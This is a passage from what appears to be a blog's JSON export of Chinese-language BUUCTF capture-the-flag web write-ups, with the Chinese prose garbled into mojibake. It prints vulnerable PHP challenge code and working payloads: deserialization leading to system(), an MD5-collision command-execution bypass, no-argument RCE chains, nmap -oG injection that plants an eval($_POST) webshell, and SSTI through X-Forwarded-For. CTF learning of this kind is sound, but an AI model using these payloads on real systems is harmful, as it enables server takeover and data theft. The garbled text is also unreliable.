¹æ®æˆ‘ä»¬åºåˆ—åŒ–å­—ç¬¦ä¸²çš„èµ‹å€¼æ¥æ‰§è¡Œã€‚ä¹Ÿå°±æ˜¯è¯´å¯ä»¥é€šè¿‡ååºåˆ—åŒ–å¯¹$funcå’Œ$på†èµ‹å€¼ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç»•å¼€é»‘åå•çš„é™åˆ¶äº†ã€‚ spï¼šå¸¸ç”¨å‘½ä»¤å°ç»“ 12345system(&#39;ls&#39;) : åˆ—ä¸¾å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶system(&quot;find &#x2F; -name flag*&quot;)ï¼šæŸ¥æ‰¾æ‰€æœ‰æ–‡ä»¶ååŒ¹é…flagçš„æ–‡ä»¶system(&quot;cat $(find &#x2F; -name flag*)&quot;)ï¼šæ‰“å°æ‰€æœ‰æ–‡ä»¶ååŒ¹é…flagçš„æ–‡ä»¶ æ„é€ åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼š å› æ­¤æˆ‘ä»¬æœ€åçš„payloadå°±æ˜¯ï¼šfunc=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:25:&quot;cat $(find / -name flag*)&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf12","date":"2021-07-22T03:01:28.000Z","path":"2021/07/22/buuctf12/","text":"[å®‰æ´µæ¯ 2019]easy_webæ‰“å¼€å®¹å™¨ ä¸€.å‰æœŸæ¢ç´¢æ³¨æ„åˆ°ä¸€ä¸²åƒbase64ç¼–ç çš„å­—ç¬¦ä¸²ï¼Œå¯¹å…¶è§£ç ï¼š 123base64è§£ç ï¼šMzUzNTM1MmU3MDZlNjc=base64è§£ç ï¼š3535352e706e67hexè§£ç ï¼š555.png ä¹Ÿå°±æ˜¯è¯´å®ƒå¯¹555.pngå…ˆåè¿›è¡Œäº†ä¸€æ¬¡hexç¼–ç å’Œä¸¤æ¬¡base64ç¼–ç ï¼Œä½†æ˜¯æˆ‘ä»¬å¥½åƒçš„è§£ç å¾—åˆ°äº†å›¾ç‰‡åä¹Ÿä¸èƒ½åšä»€ä¹ˆï¼Œå†çœ‹çœ‹æºç ï¼š å¾ˆé•¿ä¸€ä¸²base64ç¼–ç ä¸²ï¼Œå¯¹å…¶è§£ç  æ„Ÿè§‰åº”è¯¥å°±æ˜¯æˆ‘ä»¬ä¸Šä¼ çš„555.pngè¿™ä¸ªå›¾ç‰‡çš„å†…å®¹ï¼Œå°è¯•å¯¹index.phpè¿›è¡Œä¸€æ¬¡hexç¼–ç å’Œä¸¤æ¬¡base64ç¼–ç ï¼šTmprMlJUWTBOalUzT0RKRk56QTJPRGN3ï¼Œç„¶åä¼ å‚ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½è¿”å›index.phpæ–‡ä»¶çš„å†…å®¹ã€‚ å¯¹å›æ˜¾çš„å­—ç¬¦ä¸²base64è§£ç ï¼Œå¾—ï¼š 123456789101112131415161718192021222324252627282930&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header(&#x27;content-type:text/html;charset=utf-8&#x27;);$cmd = $_GET[&#x27;cmd&#x27;];if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;])) header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);$file = hex2bin(base64_decode(base64_decode($_GET[&#x27;img&#x27;])));$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);if (preg_match(&quot;/flag/i&quot;, $file)) &#123; echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;; die(&quot;xixiï½ no flag&quot;);&#125; else &#123; $txt = base64_encode(file_get_contents($file)); echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;; echo &quot;&lt;br&gt;&quot;;&#125;echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#x27;|\\&quot;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123; echo(&quot;forbid ~&quot;); echo &quot;&lt;br&gt;&quot;;&#125; else &#123; if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123; echo `$cmd`; &#125; else &#123; echo (&quot;md5 is funny ~&quot;); &#125;&#125;?&gt; äºŒ.ä»£ç å®¡è®¡é¦–å…ˆæˆ‘ä»¬çœ‹åˆ°ä»–å¯¹æˆ‘ä»¬ä¸Šä¼ çš„å‚æ•°imgè¿›è¡Œè§£ç ï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™$fileï¼Œç„¶åç”¨file_get_contents()å‡½æ•°å»åŒ…å«è¿™ä¸ªæ–‡ä»¶ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±ä¼šæƒ³ï¼Œèƒ½ä¸èƒ½æŠŠflag.phpæŒ‰ç…§ä»–çš„è¦æ±‚ç¼–ç åï¼Œé€šè¿‡msgä¸Šä¼ å‘¢ï¼Ÿå¾ˆæ˜æ˜¾æˆ‘ä»¬æ— æ³•é€šè¿‡è¿™æ ·åšæ¥å¾—åˆ°flagï¼Œå› ä¸ºä»–å¯¹$fileçš„å€¼è¿›è¡Œäº†ä¸¤ä¸ªæ­£åˆ™åŒ¹é…ï¼Œåšäº†ä¸¥æ ¼è¿‡æ»¤ï¼Œå› æ­¤æˆ‘ä»¬è¿™è¾¹æ˜¯æ²¡åŠæ³•ç»•è¿‡ã€‚æˆ‘ä»¬æ¥ç€å¾€ä¸‹å®¡è®¡ï¼Œå¯ä»¥çœ‹åˆ°ä»–å¯¹$cmdä¹Ÿåšäº†å¾ˆå¤šè¿‡æ»¤ã€‚ç„¶åè¿™è¾¹è¦æˆ‘ä»¬POSTä¸¤ä¸ªå‚æ•°ï¼Œå½“æ»¡è¶³ifè¯­å¥å‚æ•°açš„å€¼ç­‰å‚æ•°bçš„å€¼ï¼Œä¸”md5()ç¼–ç åå‚æ•°aã€bçš„å€¼ä¸åŒæ—¶ï¼Œä¼šå°†æˆ‘ä»¬ä¼ å‚çš„cmdçš„å€¼å½“ä½œä»£ç æ‰§è¡Œå®Œè¾“å‡ºã€‚ ä¸‰.æ€è·¯æ„å»ºå› æ­¤æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯å…ˆæ„é€ æ»¡è¶³ifè¯­å¥çš„ä¸¤ä¸ªå‚æ•°ï¼Œç„¶åé€šè¿‡å‘½ä»¤æ‰§è¡Œæˆ‘ä»¬çš„ä»£ç ã€‚ é‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆæ»¡è¶³ifè¯­å¥å‘¢ï¼Ÿä¸€å¼€å§‹æˆ‘æƒ³çš„æ˜¯ç”¨æ•°ç»„ç»•è¿‡ï¼Œä½†æ˜¯è¿™é‡Œå‰åŠæ®µåˆ¤æ–­è¯­å¥ç”¨stringå¼ºè¡Œè½¬å‹äº† ä¹Ÿå°±æ˜¯è¯´ç”¨æ•°ç»„æ— æ³•ç»•è¿‡ifè¯­å¥å‰åŠéƒ¨åˆ†çš„åˆ¤æ–­ï¼Œå› æ­¤æˆ‘ä»¬è¦åˆ©ç”¨MD5ç¢°æ’ï¼Œæ„é€ ä¸¤ä¸ªä¸åŒï¼Œä½†MD5ç¼–ç ç›¸åŒçš„å­—ç¬¦ä¸² a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2 b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 ç„¶åæˆ‘ä»¬è¦æ€ä¹ˆè·å–flagå‘¢ï¼Ÿ æ³•ä¸€ï¼šåœ¨linuxç³»ç»Ÿä¸­ï¼Œca\\tã€c\\atéƒ½ä¼šè¢«è§£æä¸ºcatï¼Œé‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ca\\t flagæ¥è·å–flagï¼Œä½†æ˜¯è¿™é‡Œæœ‰ä¸ªç–‘æƒ‘ï¼Œæ­£åˆ™åŒ¹é…ä¸æ˜¯æœ‰\\\\\\\\ã€\\\\ã€\\tï¼Œä½†æ˜¯è¿™é‡Œæ˜¯å¯ä»¥ç»•è¿‡çš„ï¼ŒåŸå› æ˜¯\\a \\tä¼šè¢«çœ‹åšæ˜¯ä¸€ä¸ªæ•´ä½“ï¼Œæ‰€ä»¥å¯ä»¥ç»•è¿‡åæ–œæ ï¼›è¿™é‡Œä¹‹æ‰€ä»¥æ²¡æœ‰æ­£åˆ™åŒ¹é…\\tæ˜¯å› ä¸ºæ­£åˆ™åŒ¹é…ä¸­çš„æ˜¯åŒ¹é…ä¸€ä¸ªæ°´å¹³åˆ¶è¡¨ç¬¦ï¼ˆ\\tï¼‰ï¼Œè‹¥è¦æƒ³æ‹¦æˆªå­—ç¬¦ä¸²\\t å°±è¦æ·»åŠ \\\\tæ­£åˆ™åŒ¹é…ã€‚ æ³•äºŒï¼šlinuxç³»ç»Ÿä¸­æœ‰ä¸€ä¸ªå‘½ä»¤sortï¼šå°†æ–‡ä»¶çš„æ¯ä¸€è¡Œä½œä¸ºä¸€ä¸ªå•ä½ç›¸äº’æ¯”è¾ƒï¼Œæ¯”è¾ƒåŸåˆ™æ˜¯ä»é¦–å­—ç¬¦å‘åä¾æ¬¡æŒ‰ASCIIç è¿›è¡Œæ¯”è¾ƒï¼Œæœ€åå°†å®ƒä»¬æŒ‰å‡åºè¾“å‡ºï¼ˆå°±æ˜¯æŒ‰è¡Œæ’åºï¼‰ã€‚ payloadï¼šsort /flag","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf11","date":"2021-07-21T00:40:37.000Z","path":"2021/07/21/buuctf11/","text":"[RoarCTF 2019]Easy Javaæ‰“å¼€å®¹å™¨ï¼Œå‘ç°æ˜¯ç™»å…¥é¡µé¢ ç»“åˆé¢˜ç›®ï¼Œè¿™é¢˜è‚¯å®šä¸æ˜¯SQLæ³¨å…¥äº†ï¼Œç‚¹å‡»help å¯ä»¥çœ‹åˆ°æœ‰æ–‡ä»¶åŒ…å«ï¼Œä½†æ˜¯æ²¡æœ‰åŒ…å«çš„æ–‡ä»¶æ²¡æœ‰èµ·ä½œç”¨ï¼Œå°è¯•å§GETè¯·æ±‚æ”¹ä¸ºPOST ä½†æ˜¯help.docxè¿™ä¸ªæ–‡ä»¶é‡Œæ²¡æœ‰ä»€ä¹ˆçº¿ç´¢ï¼Œç„¶åæˆ‘å°è¯•ç”¨php://filteræ–‡ä»¶è¯»å–æµè¯»å–index.phpã€flag.phpéƒ½æ²¡æœ‰æˆåŠŸ ç„¶åæˆ‘å°±æœ‰ç‚¹ä¸çŸ¥æ‰€æªäº†ï¼ŒæŸ¥çœ‹äº†ä¸€ä¸‹wpå­¦ä¹ äº†å…³äºjavaçš„ç›¸å…³åŸºç¡€çŸ¥è¯† ä¸€.é¢„å¤‡çŸ¥è¯†ï¼ˆ1ï¼‰ ï¼ˆ2ï¼‰ ï¼ˆ3ï¼‰ç”±äºå®¢æˆ·ç«¯æ˜¯é€šè¿‡URLåœ°å€è®¿é—®WebæœåŠ¡å™¨ä¸­çš„èµ„æºï¼Œæ‰€ä»¥Servletç¨‹åºè‹¥æƒ³è¢«å¤–ç•Œè®¿é—®ï¼Œå¿…é¡»æŠŠServletç¨‹åºæ˜ å°„åˆ°ä¸€ä¸ªURLåœ°å€ä¸Šï¼Œè¿™ä¸ªå·¥ä½œåœ¨web.xmlæ–‡ä»¶ä¸­ä½¿ç”¨&lt;servlet&gt;å…ƒç´ å’Œ&lt;servlet-mapping&gt;å…ƒç´ å®Œæˆã€‚&lt;servlet&gt;å…ƒç´ ç”¨äºæ³¨å†ŒServletï¼Œå®ƒåŒ…å«æœ‰ä¸¤ä¸ªä¸»è¦çš„å­å…ƒç´ ï¼š&lt;servlet-name&gt;å’Œ&lt;servlet-class&gt;ï¼Œåˆ†åˆ«ç”¨äºè®¾ç½®Servletçš„æ³¨å†Œåç§°å’ŒServletçš„å®Œæ•´ç±»åã€‚ä¸€ä¸ª&lt;servlet-mapping&gt;å…ƒç´ ç”¨äºæ˜ å°„ä¸€ä¸ªå·²æ³¨å†Œçš„Servletçš„ä¸€ä¸ªå¯¹å¤–è®¿é—®è·¯å¾„ï¼Œå®ƒåŒ…å«æœ‰ä¸¤ä¸ªå­å…ƒç´ ï¼š&lt;servlet-name&gt;å’Œ&lt;url-pattern&gt;ï¼Œåˆ†åˆ«ç”¨äºæŒ‡å®šServletçš„æ³¨å†Œåç§°å’ŒServletçš„å¯¹å¤–è®¿é—®è·¯å¾„ã€‚ä¾‹å¦‚ï¼š 12345678&lt;servlet&gt; &lt;servlet-name&gt;ServletDemo1&lt;&#x2F;servlet-name&gt; &lt;servlet-class&gt;cn.itcast.ServletDemo1&lt;&#x2F;servlet-class&gt;&lt;&#x2F;servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;ServletDemo1&lt;&#x2F;servlet-name&gt; &lt;url-pattern&gt;&#x2F;ServletDemo1&lt;&#x2F;url-pattern&gt;&lt;&#x2F;servlet-mapping&gt; äºŒ.å°è¯•è§£é¢˜å…ˆè®¿é—®WEB-INF/web.xmlï¼Œè·å–classæ–‡ä»¶è·¯å¾„ æˆ‘ä»¬çœ‹åˆ°æœ‰æˆ‘ä»¬æƒ³è¦çš„flagæ–‡ä»¶ï¼Œæ„é€ è·¯å¾„ payload:WEB-INF/classes/com/wm/ctf/FlagController.class å¯ä»¥çœ‹åˆ°å›æ˜¾æœ‰ä¸€ä¸²base64ç¼–ç ï¼Œè§£ç å¾—flagï¼š [GXYCTF2019]ç¦æ­¢å¥—å¨ƒæ‰“å¼€å®¹å™¨ï¼Œå°±ä¸€å¥è¯ ä¸€.å‰æœŸæ¢ç´¢æŸ¥çœ‹æºç ï¼Œä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼›æŠ“åŒ…ä¹Ÿæ²¡æœ‰çº¿ç´¢ï¼›ç”¨dirsearchè·‘buuä¼šå´©ï¼›æœ€åç”¨GitHackå‘ç°å­˜åœ¨gitæºç æ³„éœ² æ‰“å¼€index.phpï¼š 123456789101112131415161718192021222324&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;;if(isset($_GET[&#x27;exp&#x27;]))&#123; if (!preg_match(&#x27;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123; if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123; if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123; // echo $_GET[&#x27;exp&#x27;]; @eval($_GET[&#x27;exp&#x27;]); &#125; else&#123; die(&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;); &#125; &#125; else&#123; die(&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;); &#125; &#125; else&#123; die(&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;); &#125;&#125;// highlight_file(__FILE__);?&gt; ä»£ç å®¡è®¡ï¼š 1.ç¬¬ä¸€ä¸ªæ­£åˆ™åŒ¹é…ï¼šä»–ç¦ç”¨äº†å‡ ç§çš„ä¼ªåè®®ï¼Œä¹Ÿå°±æ˜¯è¯´é™åˆ¶æˆ‘ä»¬ä½¿ç”¨ä¼ªåè®®å»è¯»å–åå°æ–‡ä»¶ï¼› 2.ç¬¬äºŒä¸ªæ­£åˆ™åŒ¹é…ï¼š(?R)æ˜¯å¼•ç”¨å½“å‰è¡¨è¾¾å¼,è€Œ(?R)?å¯ä»¥å¼•ç”¨ä¹Ÿå¯ä»¥ä¸å¼•ç”¨äº†ï¼Œå¼•ç”¨ä¸€æ¬¡æ­£åˆ™åˆ™å˜æˆäº†[a-z,_]+\\([a-z,_]+\\((?R)?\\)\\),å¯ä»¥è¿­ä»£ä¸‹å»ï¼Œé‚£ä¹ˆå®ƒæ‰€åŒ¹é…çš„å°±æ˜¯a(b(c()));ç±»ä¼¼è¿™ç§å¯ä»¥æ‹¬å·å’Œå­—ç¬¦ç»„æˆçš„ï¼Œè¿™å…¶å®æ˜¯æ— å‚æ•°RCEæ¯”è¾ƒå…¸å‹çš„ä¾‹å­ï¼› 3.ç¬¬ä¸‰ä¸ªæ­£åˆ™åŒ¹é…ï¼šè¿‡æ»¤äº†et|na|info|dec|bin|hex|oct|pi|logè¿™å‡ ç§è¯æ ¹ äºŒ.æ€è·¯æ„å»ºæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹æœåŠ¡å™¨ä¸­è¯¥ç›®å½•ä¸‹å­˜åœ¨å“ªäº›æ–‡ä»¶ï¼Œå¾€å¸¸æ¥è¯´ç”¨æŒ‡ä»¤scandir(&#39;.&#39;)å°±è¡Œï¼Œä½†æ˜¯è¿™é‡Œç”±äºç¬¬äºŒä¸ªæ­£åˆ™åŒ¹é…ä¸èƒ½ä¼ å‚ã€‚é‚£è¦æ€ä¹ˆå»è·å–è¿™ä¸ª.å‘¢ï¼Ÿ è¿™é‡Œå…ˆä»‹ç»ä¸¤ä¸ªå‡½æ•°ï¼š 1.localeconv()å‡½æ•°ï¼šè¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚ 2.current()ï¼šè¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚ çŸ¥é“äº†è¿™ä¸¤ä¸ªå‡½æ•°æˆ‘ä»¬å°±å¯ä»¥æ„é€ payloadï¼š?exp=print_r(scandir(current(localeconv())))ï¼› å¯ä»¥çœ‹åˆ°å­˜åœ¨flag.phpï¼Œé‚£æˆ‘ä»¬è¦å°è¯•å»è¯»å–å®ƒ å†ä»‹ç»å‡ ä¸ªå‡½æ•°ï¼š array_reverse() ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„ array_flip() äº¤æ¢æ•°ç»„çš„é”®å’Œå€¼ array_rand() ä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒ(è¿”å›çš„æ˜¯é”®å)ï¼Œä¸æ–­åˆ·æ–°è®¿é—®å°±ä¼šä¸æ–­éšæœºè¿”å› next() æŠŠæŒ‡å‘å½“å‰å…ƒç´ çš„æŒ‡é’ˆç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªå…ƒç´ çš„ä½ç½®ï¼Œå¹¶è¿”å›å½“å‰å…ƒç´ çš„å€¼ã€‚ å› æ­¤æˆ‘ä»¬è¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥è¯»å–flag.phpæ–‡ä»¶ï¼Œç”±äºget_file_contentsè¢«ç¦äº†ï¼ˆå«etï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨readfileã€show_sourceã€highlight_fileè¯»å–æ–‡ä»¶ payload1ï¼š?exp=show_source(next(array_reverse(scandir(current(localeconv()))))); payload2ï¼š?exp=readfile(array_rand(array_flip(scandir(current(localeconv())))));è¿™ç§æ–¹æ³•ç”±äºé‡‡ç”¨äº†array_randï¼Œæ–‡ä»¶è¯»å–å…·æœ‰éšæœºæ€§ï¼Œå› æ­¤è¦å¤šè¯•å‡ æ¬¡å‡ºflag å‚è€ƒèµ„æ–™ï¼šæ— å‚æ•°RCEï¼š https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE https://www.freesion.com/article/1919383150/","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf10","date":"2021-07-20T00:35:40.000Z","path":"2021/07/20/buuctf10/","text":"[BUUCTF 2018]Online Toolæ‰“å¼€å®¹å™¨ï¼Œå‘ç°æ˜¯ä¸€æ®µä»£ç ï¼š 123456789101112131415161718&lt;?phpif (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123; $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];&#125;if(!isset($_GET[&#x27;host&#x27;])) &#123; highlight_file(__FILE__);&#125; else &#123; $host = $_GET[&#x27;host&#x27;]; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]); echo &#x27;you are in sandbox &#x27;.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);&#125; ä¸€.é¢„å¤‡çŸ¥è¯† escapeshellarg â€”â€”æŠŠå­—ç¬¦ä¸²è½¬ç ä¸ºå¯ä»¥åœ¨ shell å‘½ä»¤é‡Œä½¿ç”¨çš„å‚æ•° åŠŸèƒ½ ï¼šescapeshellarg() å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œshell å‡½æ•°åŒ…å« exec(), system() æ‰§è¡Œè¿ç®—ç¬¦(åå¼•å·) escapeshellcmd â€”â€” shell å…ƒå­—ç¬¦è½¬ä¹‰ åŠŸèƒ½ï¼šescapeshellcmd() å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ° exec() æˆ– system() å‡½æ•°ï¼Œæˆ–è€… æ‰§è¡Œæ“ä½œç¬¦ ä¹‹å‰è¿›è¡Œè½¬ä¹‰ã€‚ åæ–œçº¿ï¼ˆ\\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š&amp;#;|?~&lt;&gt;^()[]{}$*, \\x0A å’Œ \\xFFã€‚ &#39; å’Œ &quot;ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ % å’Œ ! å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚ ä¸¾ä¸ªä¾‹å­ ä¼ å…¥å‚æ•°ï¼š127.0.0.1&#39; -d a=1 ç»è¿‡escapeshellarg()å‡½æ•°å¤„ç†åå˜æˆï¼š&#39;127.0.0.1&#39;\\&#39;&#39; -d a=1&#39; å†ç»è¿‡escapeshellcmd()å‡½æ•°å¤„ç†åå˜æˆï¼š&#39;127.0.0.1&#39;\\\\&#39;&#39; -d a=1\\&#39; æ¯å¯¹å•å¼•å·é…å¯¹å½¢æˆè¿æ¥ç¬¦ï¼Œæœ€ç»ˆå¾—ç®€åŒ–ä¸ºï¼š127.0.0.1\\ -d a=1&#39;ï¼Œå³å‘127.0.0.1\\å‘èµ·è¯·æ±‚ï¼ŒPOST æ•°æ®ä¸ºa=1â€™ã€‚ nmapå‘½ä»¤-oGï¼šå°†ä¸€ä¸ªå‘½ä»¤å’Œç»“æœå†™å…¥åˆ°è‡ªå·±æŒ‡å®šçš„æ–‡ä»¶ä¸­ äºŒ.æ„é€ payloadç¬¬ä¸€ç§ï¼šæ–‡ä»¶åå’Œå•å¼•å·ä¹‹é—´æœ‰ç©ºæ ¼ payloadï¼š&#39;&lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG webshell.php &#39; ç»è¿‡ä¸¤ä¸ªè¿‡æ»¤å‡½æ•°å¤„ç†åï¼š&#39;\\\\&#39;&#39;\\&lt;\\?php @eval\\(\\$_POST\\[&quot;hack&quot;\\]\\)\\;\\?\\&gt; -oG webshell.php &#39;\\\\&#39;&#39; è¿™æ ·æˆ‘ä»¬åå°ç”Ÿæˆçš„æ–‡ä»¶åå°±æ˜¯webshell.php ç®­å¤´æŒ‡å°±æ˜¯ä¸Šä¼ ç”Ÿæˆæ–‡ä»¶çš„æ–‡ä»¶å¤¹çš„åç§°ï¼Œç”¨èšå‰‘ç›´æ¥è¿æ¥æˆ‘ä»¬çš„æœ¨é©¬ã€‚ ç¬¬äºŒç§ï¼šæ–‡ä»¶åå’Œå•å¼•å·ä¹‹é—´æ²¡æœ‰ç©ºæ ¼ payloadï¼š&#39;&lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG webshell.php&#39; ç»è¿‡ä¸¤ä¸ªè¿‡æ»¤å‡½æ•°å¤„ç†åï¼š&#39;\\\\&#39;&#39;\\&lt;\\?php @eval\\(\\$_POST\\[&quot;hack&quot;\\]\\)\\;\\?\\&gt; -oG webshell.php&#39;\\\\&#39;&#39; è¿™æ ·åå°ç”Ÿæˆçš„æ–‡ä»¶åå°±æ˜¯webshell.php\\\\ï¼Œå°±ä¸èƒ½ç”¨èšå‰‘è¿æ¥äº† [BJDCTF2020]The mystery of ipæ‰“å¼€å®¹å™¨ï¼Œå‘ç°æ˜¯ä¸€ä¸ªâ€å¾ˆå¹²å‡€â€œçš„ç½‘é¡µ ä¸€.æ¢ç´¢ç‚¹å‡»Flagè¿›å…¥é¡µé¢ï¼š æ˜¯æˆ‘ä»¬çš„ipåœ°å€ æŸ¥çœ‹ç½‘é¡µæºç ï¼Œæ²¡ä»€ä¹ˆæœ‰ç”¨ä¿¡æ¯ï¼Œçœ‹ä¸‹ä¸€ä¸ªç½‘é¡µ ç‚¹å‡»hintï¼š æŸ¥çœ‹æºç ï¼š è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±æƒ³äº†ä»–æ€ä¹ˆçŸ¥é“æˆ‘ä»¬çš„ipçš„ï¼ŒXFFå—è¿˜æ˜¯client-ipï¼Œæˆ‘ä»¬å¯ä¸å¯ä»¥æ§åˆ¶ipçš„å€¼å‘¢ï¼Ÿ äºŒ.ç‰›åˆ€å°è¯•å¸¦ç€ä¸Šé¢çš„ç–‘æƒ‘ï¼ŒæŠ“åŒ…ï¼Œä½†æ˜¯æˆ‘å‘ç°åŸæœ¬å¹¶æ²¡æœ‰XFFæˆ–æ˜¯client-ipï¼Œé‚£æˆ‘ä»¬åŠ ä¸€ä¸ªXFF æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»–æŠŠæˆ‘ä»¬çš„è¾“å…¥ç›´æ¥è¾“å‡ºåˆ°äº†ç½‘é¡µä¸Šã€‚è¿™é‡Œæˆ‘ä»¬è”æƒ³åˆ°SSTIä¸­ä¹Ÿæ˜¯æœåŠ¡ç«¯æŠŠç”¨æˆ·è¾“å…¥çš„å†…å®¹æ¸²æŸ“æˆæ¨¡æ¿ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¯•ä¸€ä¸‹æ˜¯å¦å­˜åœ¨SSTIæ³¨å…¥ å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨æ‰§è¡Œäº†æˆ‘ä»¬çš„é€»è¾‘è¿ç®—ï¼ŒSSTIçŸ³é”¤äº† ä¸‰.æ„é€ payloadpayloadï¼šX-Forwarded-For: {system(â€˜lsâ€™)} payloadï¼šX-Forwarded-For: {system(â€˜cat flag.phpâ€™)} å‘ç°flagä¸åœ¨è¿™é‡Œé¢ï¼Œé‚£æŒ‰ç…§ç»éªŒæ¥è¯´ä¸€èˆ¬ä¼šæ”¾åœ¨æ 